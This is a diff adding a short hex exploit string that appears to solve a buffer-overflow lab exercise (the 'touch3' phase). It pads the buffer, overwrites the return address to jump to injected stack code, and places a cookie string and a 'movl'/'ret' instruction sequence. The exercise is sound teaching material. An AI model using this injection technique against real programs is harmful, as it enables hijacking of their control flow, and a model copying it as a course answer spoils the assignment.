@@ -1,0 +1,6 @@
+41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 /* insert A 40 times */
+b9 dc 61 55 00 00 00 00		/* address of my injected code */
+fa 18 40 00 00 00 00 00		/* address of touch3 */
+35 39 62 39 39 37 66 61 00	/* string of "59b997fa" */
+bf b0 dc 61 55		/* movl $0x5561dcb0,%edi */
+c3			/* ret */ 
